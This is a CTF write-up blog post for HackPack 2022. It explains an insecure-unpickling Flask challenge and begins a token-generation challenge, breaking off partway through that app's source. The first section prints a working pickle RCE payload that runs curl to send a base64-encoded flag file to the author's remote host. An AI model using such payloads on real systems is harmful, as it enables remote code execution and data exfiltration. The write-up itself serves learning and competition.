<!DOCTYPE html>
<html lang="en-us">
<head>
  <link rel="preload" href="/lib/font-awesome/webfonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin="anonymous">
  <link rel="preload" href="/lib/font-awesome/webfonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin="anonymous">
  <link rel="preload" href="/lib/font-awesome/webfonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin="anonymous">
  <link rel="preload" href="/lib/JetBrainsMono/web/woff2/JetBrainsMono-Regular.woff2" as="font" type="font/woff2" crossorigin="anonymous">
  <script type="text/javascript" src="https://latest.cactus.chat/cactus.js"></script>
  <link rel="stylesheet" href="https://latest.cactus.chat/style.css" type="text/css">
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <title> Writeup: HackPackCTF-2022 | ev1lm0rty</title>
  <link rel = 'canonical' href = 'https://ev1lm0rty.com/posts/writeup-hackpack-2022/'>
  <meta name="description" content="Hello World..!!! This is Shubham Arya (ev1lm0rty), I am an InfoSec geek with a knack for automating boring stuff. I Love playing CTFs and Wargames in my free time. This website highlights my work (most of it is just the stuff I make in my free time). If you like, you can contribute to it too and maybe [buy me a beer](https://buymeacoffee.com/ev1lm0rty) :)">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="robots" content="all,follow">
  <meta name="googlebot" content="index,follow,snippet,archive">
  <meta property="og:title" content="Writeup: HackPackCTF-2022" />
<meta property="og:description" content="About Hello readers, I have regularly started playing CTFs on the weekends again. I hope this time that I&rsquo;ll be regular.
Last weekend I played the HackPack2022 CTF. It was a really fun CTF and I learned a lot of things.
Out of all the challenges solved, I am posting the writeups of the most interesting ones. Enjoy !
Web: Imported Kimichi This challenge highlighted &ldquo;insecure unpickling&rdquo; bug . The challenge gave us a website which we can use for image upload and later viewing." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://ev1lm0rty.com/posts/writeup-hackpack-2022/" />
<meta property="article:published_time" content="2022-04-11T12:26:56+05:30" />
<meta property="article:modified_time" content="2022-04-11T12:26:56+05:30" />

  <meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="Writeup: HackPackCTF-2022"/>
<meta name="twitter:description" content="About Hello readers, I have regularly started playing CTFs on the weekends again. I hope this time that I&rsquo;ll be regular.
Last weekend I played the HackPack2022 CTF. It was a really fun CTF and I learned a lot of things.
Out of all the challenges solved, I am posting the writeups of the most interesting ones. Enjoy !
Web: Imported Kimichi This challenge highlighted &ldquo;insecure unpickling&rdquo; bug . The challenge gave us a website which we can use for image upload and later viewing."/>

  
  
    
  
  
  <link rel="stylesheet" href="https://ev1lm0rty.com/css/styles.c05d68261bf086a9d7713c4f8a6215a3601608e267a816a7ee58f139b3d1aae51222aae2081c8e0c6bd35e1334773b7a16283022f31f92afd93bb37e5e822e66.css" integrity="sha512-wF1oJhvwhqnXcTxPimIVo2AWCOJnqBan7ljxObPRquUSIqriCByODGvTXhM0dzt6FigwIvMfkq/ZO7N&#43;XoIuZg=="> 

  
  
  
    <!--[if lt IE 9]>
      <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->
  

  
<link rel="icon" type="image/png" href="https://ev1lm0rty.com/images/favicon.ico" />

  
  
</head>

<body class="max-width mx-auto px3 ltr">
  <div class="content index py4">

  <div id="header-post">
  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;" aria-label="Top of Page"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
        <li><a href="/">Home</a></li>
         
        <li><a href="/posts">Posts</a></li>
         
        <li><a href="/tags">Tags</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li>
          <a class="icon" href=" https://ev1lm0rty.com/posts/shell-tips-and-tricks/" aria-label="Previous">
            <i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i>
          </a>
        </li>
        
        
        <li>
          <a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" aria-label="Top of Page">
            <i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i>
          </a>
        </li>
        <li>
          <a class="icon" href="#" aria-label="Share">
            <i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i>
          </a>
        </li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      
      <ul>
  
  
    
  
  
  <li>
    <a class="icon" href="http://www.facebook.com/sharer.php?u=https%3a%2f%2fev1lm0rty.com%2fposts%2fwriteup-hackpack-2022%2f" aria-label="Facebook">
      <i class="fab fa-facebook " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://twitter.com/share?url=https%3a%2f%2fev1lm0rty.com%2fposts%2fwriteup-hackpack-2022%2f&text=Writeup%3a%20HackPackCTF-2022" aria-label="Twitter">
      <i class="fab fa-twitter " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2fev1lm0rty.com%2fposts%2fwriteup-hackpack-2022%2f&title=Writeup%3a%20HackPackCTF-2022" aria-label="Linkedin">
      <i class="fab fa-linkedin " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2fev1lm0rty.com%2fposts%2fwriteup-hackpack-2022%2f&is_video=false&description=Writeup%3a%20HackPackCTF-2022" aria-label="Pinterest">
      <i class="fab fa-pinterest " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="mailto:?subject=Writeup%3a%20HackPackCTF-2022&body=Check out this article: https%3a%2f%2fev1lm0rty.com%2fposts%2fwriteup-hackpack-2022%2f" aria-label="Email">
      <i class="fas fa-envelope " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://getpocket.com/save?url=https%3a%2f%2fev1lm0rty.com%2fposts%2fwriteup-hackpack-2022%2f&title=Writeup%3a%20HackPackCTF-2022" aria-label="Pocket">
      <i class="fab fa-get-pocket " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="http://reddit.com/submit?url=https%3a%2f%2fev1lm0rty.com%2fposts%2fwriteup-hackpack-2022%2f&title=Writeup%3a%20HackPackCTF-2022" aria-label="reddit">
      <i class="fab fa-reddit " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="http://www.tumblr.com/share/link?url=https%3a%2f%2fev1lm0rty.com%2fposts%2fwriteup-hackpack-2022%2f&name=Writeup%3a%20HackPackCTF-2022&description=About%20Hello%20readers%2c%20I%20have%20regularly%20started%20playing%20CTFs%20on%20the%20weekends%20again.%20I%20hope%20this%20time%20that%20I%26rsquo%3bll%20be%20regular.%0aLast%20weekend%20I%20played%20the%20HackPack2022%20CTF.%20It%20was%20a%20really%20fun%20CTF%20and%20I%20learned%20a%20lot%20of%20things.%0aOut%20of%20all%20the%20challenges%20solved%2c%20I%20am%20posting%20the%20writeups%20of%20the%20most%20interesting%20ones.%20Enjoy%20%21%0aWeb%3a%20Imported%20Kimichi%20This%20challenge%20highlighted%20%26ldquo%3binsecure%20unpickling%26rdquo%3b%20bug%20.%20The%20challenge%20gave%20us%20a%20website%20which%20we%20can%20use%20for%20image%20upload%20and%20later%20viewing." aria-label="Tumblr">
      <i class="fab fa-tumblr " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fev1lm0rty.com%2fposts%2fwriteup-hackpack-2022%2f&t=Writeup%3a%20HackPackCTF-2022" aria-label="Hacker News">
      <i class="fab fa-hacker-news " aria-hidden="true"></i>
    </a>
  </li>
</ul>

    </div>
    
    <div id="toc">
      <nav id="TableOfContents">
  <ul>
    <li><a href="#about">About</a></li>
    <li><a href="#web--imported-kimichi">Web:  Imported Kimichi</a></li>
    <li><a href="#2-web-tuplecoin">2. Web TupleCoin</a></li>
    <li><a href="#rev-3t-3nd-ur-hom3">Rev: 3T 3ND UR HOM3</a>
      <ul>
        <li><a href="#the-skiddie-way--using-objection">The Skiddie Way : Using Objection</a></li>
        <li><a href="#pro-way-manual-function-override-using-frida">Pro Way: Manual function override using frida.</a></li>
      </ul>
    </li>
    <li><a href="#conclusion">Conclusion</a></li>
  </ul>
</nav>
    </div>
    
  </span>
</div>


  <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
    <header>
      <h1 class="posttitle" itemprop="name headline">
        Writeup: HackPackCTF-2022
      </h1>
      <div class="meta">
        
        <div class="postdate">
          
          <time datetime="2022-04-11 12:26:56 &#43;0530 IST" itemprop="datePublished">2022-04-11</time>
          
        </div>
        
        
        
        
        <div class="article-tag">
            <i class="fas fa-tag"></i>
            
            
            <a class="tag-link" href="/tags/ctf" rel="tag">ctf</a>
            
             ,  
            <a class="tag-link" href="/tags/writeup" rel="tag">writeup</a>
            
             ,  
            <a class="tag-link" href="/tags/web" rel="tag">web</a>
            
             ,  
            <a class="tag-link" href="/tags/android" rel="tag">android</a>
            
             ,  
            <a class="tag-link" href="/tags/frida" rel="tag">frida</a>
            
             ,  
            <a class="tag-link" href="/tags/objection" rel="tag">objection</a>
            
        </div>
        
      </div>
    </header>

  
    
    <div class="content" itemprop="articleBody">
      <h2 id="about">About</h2>
<p>Hello readers, I have regularly started playing CTFs on the weekends again. I hope this time that I&rsquo;ll be regular.</p>
<p>Last weekend I played the <a href="https://hackpack.club/ctf2022/">HackPack2022</a> CTF. It was a really fun CTF and I learned a lot of things.</p>
<p>Out of all the challenges solved, I am posting the writeups of the most interesting ones. Enjoy !</p>
<p><img src="/images/hackpack2022/Pasted%20image%2020220411204154.png" alt=""></p>
<h2 id="web--imported-kimichi">Web:  Imported Kimichi</h2>
<p>This challenge highlighted &ldquo;insecure unpickling&rdquo; bug . The challenge gave us a website which we can use for image upload and later viewing.</p>
<p>It also provided with the app&rsquo;s source code.
here it is.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span style="color:#ff79c6">import</span> uuid
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span style="color:#ff79c6">from</span> flask <span style="color:#ff79c6">import</span> <span style="color:#ff79c6">*</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span style="color:#ff79c6">from</span> flask_bootstrap <span style="color:#ff79c6">import</span> Bootstrap
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span style="color:#ff79c6">import</span> pickle
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span style="color:#ff79c6">import</span> os
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span>app <span style="color:#ff79c6">=</span> Flask(__name__)
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span>Bootstrap(app)
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span>app<span style="color:#ff79c6">.</span>secret_key <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;sup3r s3cr3t k3y&#39;</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span>ALLOWED_EXTENSIONS <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">set</span>([<span style="color:#f1fa8c">&#39;png&#39;</span>, <span style="color:#f1fa8c">&#39;jpg&#39;</span>, <span style="color:#f1fa8c">&#39;jpeg&#39;</span>])
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14</span>images <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">set</span>()
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15</span>images<span style="color:#ff79c6">.</span>add(<span style="color:#f1fa8c">&#39;bibimbap.jpg&#39;</span>)
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16</span>images<span style="color:#ff79c6">.</span>add(<span style="color:#f1fa8c">&#39;galbi.jpg&#39;</span>)
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17</span>images<span style="color:#ff79c6">.</span>add(<span style="color:#f1fa8c">&#39;pickled_kimchi.jpg&#39;</span>)
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19</span>@app.route(<span style="color:#f1fa8c">&#39;/&#39;</span>)
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20</span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">index</span>():
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21</span>    <span style="color:#ff79c6">return</span> render_template(<span style="color:#f1fa8c">&#34;index.html&#34;</span>, images<span style="color:#ff79c6">=</span>images)
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23</span>@app.route(<span style="color:#f1fa8c">&#39;/upload&#39;</span>, methods<span style="color:#ff79c6">=</span>[<span style="color:#f1fa8c">&#39;GET&#39;</span>, <span style="color:#f1fa8c">&#39;POST&#39;</span>])
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24</span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">upload</span>():
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25</span>    <span style="color:#ff79c6">if</span> request<span style="color:#ff79c6">.</span>method <span style="color:#ff79c6">==</span> <span style="color:#f1fa8c">&#39;POST&#39;</span>:
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26</span>        image <span style="color:#ff79c6">=</span> request<span style="color:#ff79c6">.</span>files[<span style="color:#f1fa8c">&#34;image&#34;</span>]
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27</span>        <span style="color:#ff79c6">if</span> image <span style="color:#ff79c6">and</span> image<span style="color:#ff79c6">.</span>filename<span style="color:#ff79c6">.</span>split(<span style="color:#f1fa8c">&#34;.&#34;</span>)[<span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span>]<span style="color:#ff79c6">.</span>lower() <span style="color:#ff79c6">in</span> ALLOWED_EXTENSIONS:
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28</span>            <span style="color:#6272a4"># special file names are fun!</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29</span>            extension <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;.&#34;</span> <span style="color:#ff79c6">+</span> image<span style="color:#ff79c6">.</span>filename<span style="color:#ff79c6">.</span>split(<span style="color:#f1fa8c">&#34;.&#34;</span>)[<span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span>]<span style="color:#ff79c6">.</span>lower()
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30</span>            fancy_name <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">str</span>(uuid<span style="color:#ff79c6">.</span>uuid4()) <span style="color:#ff79c6">+</span> extension
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32</span>            image<span style="color:#ff79c6">.</span>save(os<span style="color:#ff79c6">.</span>path<span style="color:#ff79c6">.</span>join(<span style="color:#f1fa8c">&#39;./images&#39;</span>, fancy_name))
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33</span>            flash(<span style="color:#f1fa8c">&#34;Successfully uploaded image! View it at /images/&#34;</span> <span style="color:#ff79c6">+</span> fancy_name, <span style="color:#f1fa8c">&#34;success&#34;</span>)
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34</span>            <span style="color:#ff79c6">return</span> redirect(url_for(<span style="color:#f1fa8c">&#39;upload&#39;</span>))
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36</span>        <span style="color:#ff79c6">else</span>:
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37</span>            flash(<span style="color:#f1fa8c">&#34;An error occured while uploading the image! Support filetypes are: png, jpg, jpeg&#34;</span>, <span style="color:#f1fa8c">&#34;danger&#34;</span>)
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38</span>            <span style="color:#ff79c6">return</span> redirect(url_for(<span style="color:#f1fa8c">&#39;upload&#39;</span>))
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40</span>    <span style="color:#ff79c6">else</span>:
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41</span>        <span style="color:#ff79c6">return</span> render_template(<span style="color:#f1fa8c">&#34;upload.html&#34;</span>)
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">42</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">43</span>@app.route(<span style="color:#f1fa8c">&#39;/images/&lt;filename&gt;&#39;</span>)
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">44</span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">display_image</span>(filename):
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">45</span>    <span style="color:#ff79c6">try</span>:
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">46</span>        pickle<span style="color:#ff79c6">.</span>loads(<span style="color:#8be9fd;font-style:italic">open</span>(<span style="color:#f1fa8c">&#39;./images/&#39;</span> <span style="color:#ff79c6">+</span> filename, <span style="color:#f1fa8c">&#39;rb&#39;</span>)<span style="color:#ff79c6">.</span>read())
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">47</span>    <span style="color:#ff79c6">except</span>:
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">48</span>        <span style="color:#ff79c6">pass</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">49</span>    <span style="color:#ff79c6">return</span> send_from_directory(<span style="color:#f1fa8c">&#39;./images&#39;</span>, filename)
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">50</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">51</span><span style="color:#ff79c6">if</span> __name__ <span style="color:#ff79c6">==</span> <span style="color:#f1fa8c">&#34;__main__&#34;</span>:
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">52</span>    app<span style="color:#ff79c6">.</span>run(host<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#39;0.0.0.0&#39;</span>)
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">53</span>
</code></pre></div><p>Looking at the source code, we deduce that the app is checking for image extension and then uploading it to <code>/images/</code> directory with a random name.</p>
<p>The interesting part is in the <code>/image/&lt;filename&gt;</code> route</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span>@app.route(<span style="color:#f1fa8c">&#39;/images/&lt;filename&gt;&#39;</span>)
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">display_image</span>(filename):
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span>    <span style="color:#ff79c6">try</span>:
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4</span>        pickle<span style="color:#ff79c6">.</span>loads(<span style="color:#8be9fd;font-style:italic">open</span>(<span style="color:#f1fa8c">&#39;./images/&#39;</span> <span style="color:#ff79c6">+</span> filename, <span style="color:#f1fa8c">&#39;rb&#39;</span>)<span style="color:#ff79c6">.</span>read())
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5</span>    <span style="color:#ff79c6">except</span>:
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6</span>        <span style="color:#ff79c6">pass</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7</span>    <span style="color:#ff79c6">return</span> send_from_directory(<span style="color:#f1fa8c">&#39;./images&#39;</span>, filename)
</code></pre></div><p>as you can see right inside the &ldquo;try&rdquo; block , the app tries to load picked data from the image. And we all know that processing unsafe pickle data can lead to an rce. More about it <a href="https://medium.com/ochrona/python-pickle-is-notoriously-insecure-d6651f1974c9">here</a></p>
<p>So the steps to get an rce for this app is</p>
<ol>
<li>Create a image with insecure pickle data</li>
<li>Upload image</li>
<li>Visit image to make the app run <code>pickle.loads</code> and get an RCE.</li>
</ol>
<p>Here is the exploit I used +  modified</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span style="color:#ff79c6">import</span> pickle
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span style="color:#ff79c6">import</span> base64
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span style="color:#ff79c6">import</span> os
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span style="color:#ff79c6">class</span> <span style="color:#50fa7b">RCE</span>:
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span>    <span style="color:#ff79c6">def</span> <span style="color:#50fa7b">__reduce__</span>(self):
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span>        cmd <span style="color:#ff79c6">=</span> (<span style="color:#f1fa8c">&#39;curl http://&lt;my-aws-ip&gt;/$(cat flag.txt | base64)&#39;</span>)
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span>        <span style="color:#ff79c6">return</span> os<span style="color:#ff79c6">.</span>system, (cmd,)
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span><span style="color:#ff79c6">if</span> __name__ <span style="color:#ff79c6">==</span> <span style="color:#f1fa8c">&#39;__main__&#39;</span>:
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13</span>    pickled <span style="color:#ff79c6">=</span> pickle<span style="color:#ff79c6">.</span>dumps(RCE())
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14</span>    f <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">open</span>(<span style="color:#f1fa8c">&#34;exploit.png&#34;</span> , <span style="color:#f1fa8c">&#34;wb&#34;</span>)
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15</span>    f<span style="color:#ff79c6">.</span>write(pickled)
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16</span>    f<span style="color:#ff79c6">.</span>close()
</code></pre></div><p>This creates an image <code>exploit.png</code> which will cat the output of <code>flag.txt</code> (i just guessed it would be flag.txt, this way i bypassed the need for a reverse shell) and then curl my aws ip with the base64 encoded flag as a path.</p>
<p>Starting up a listener on AWS and uploading the file, waiting for a few seconds and we will get a response like this</p>
<p><img src="/images/hackpack2022/Pasted%20image%2020220411111141.png" alt=""></p>
<p>base64 decode and we get the flag
<img src="/images/hackpack2022/Pasted%20image%2020220411111237.png" alt=""></p>
<blockquote>
<p><strong>Note</strong>
Later the flag was changed due to some issues, so I had to exploit this again with the same exploit, and it worked.
The new flag was flag{4nd_h3r3_1_w45_th1nk1ng_v1n3g4r_w45_s4n1t4ry}</p>
</blockquote>
<hr>
<h2 id="2-web-tuplecoin">2. Web TupleCoin</h2>
<p>This challenge highlighted the &ldquo;insecure token generation&rdquo; bug.</p>
<p><strong>TLDR</strong></p>
<ol>
<li>Visit robots.txt</li>
<li>Get source code from <code> wget /app/bckup</code></li>
<li>Run exploit.py :)</li>
</ol>
<p>Here is the description for the bounty page of the website</p>
<pre><code># Bug Bounty

Can you steal Tuco's TuCos? If you can, we have a prize for you!!

Things you should know about Tuco before you begin:

-   His account number is 314159265, and you can't have it.
-   He absolutely _hates_ robots, especially ones from Silicon Valley.
-   He fights as savagely as he eats chicken. Once glance at his soiled napkin and his enemies run screaming.
</code></pre><p>So to create an account, we just have to simply use any random integer except tuco&rsquo;s account number i.e 314159265. If we use tuco&rsquo;s account number, we get an error.</p>
<ul>
<li>Create page
<img src="/images/hackpack2022/Pasted%20image%2020220411112743.png" alt=""></li>
</ul>
<p>To transfer funds, we can visit the transfer page. Requests and response shown on the right side.</p>
<ul>
<li>Transfer page
<img src="/images/hackpack2022/Pasted%20image%2020220411112652.png" alt=""></li>
</ul>
<p>And finally to certify the transaction, the app calls <code>/api/transaction/commit</code> , as can be seen on the right side.</p>
<ul>
<li>Certify
<img src="/images/hackpack2022/Pasted%20image%2020220411112842.png" alt=""></li>
</ul>
<p>Here we can see the source code for better understanding of what&rsquo;s happening behind the scenes.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  1</span><span style="color:#ff79c6">from</span> __future__ <span style="color:#ff79c6">import</span> annotations
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  2</span><span style="color:#ff79c6">import</span> hmac
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  3</span><span style="color:#ff79c6">import</span> math
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  4</span><span style="color:#ff79c6">import</span> os
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  5</span><span style="color:#ff79c6">import</span> secrets
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  6</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  7</span><span style="color:#ff79c6">from</span> fastapi <span style="color:#ff79c6">import</span> FastAPI, HTTPException
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  8</span><span style="color:#ff79c6">from</span> fastapi.responses <span style="color:#ff79c6">import</span> RedirectResponse
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  9</span><span style="color:#ff79c6">from</span> fastapi.staticfiles <span style="color:#ff79c6">import</span> StaticFiles
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 10</span><span style="color:#ff79c6">from</span> pydantic <span style="color:#ff79c6">import</span> BaseModel
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 11</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 12</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 13</span>SECRET_KEY <span style="color:#ff79c6">=</span> secrets<span style="color:#ff79c6">.</span>token_bytes(<span style="color:#bd93f9">32</span>)    <span style="color:#6272a4"># random each time we run</span>
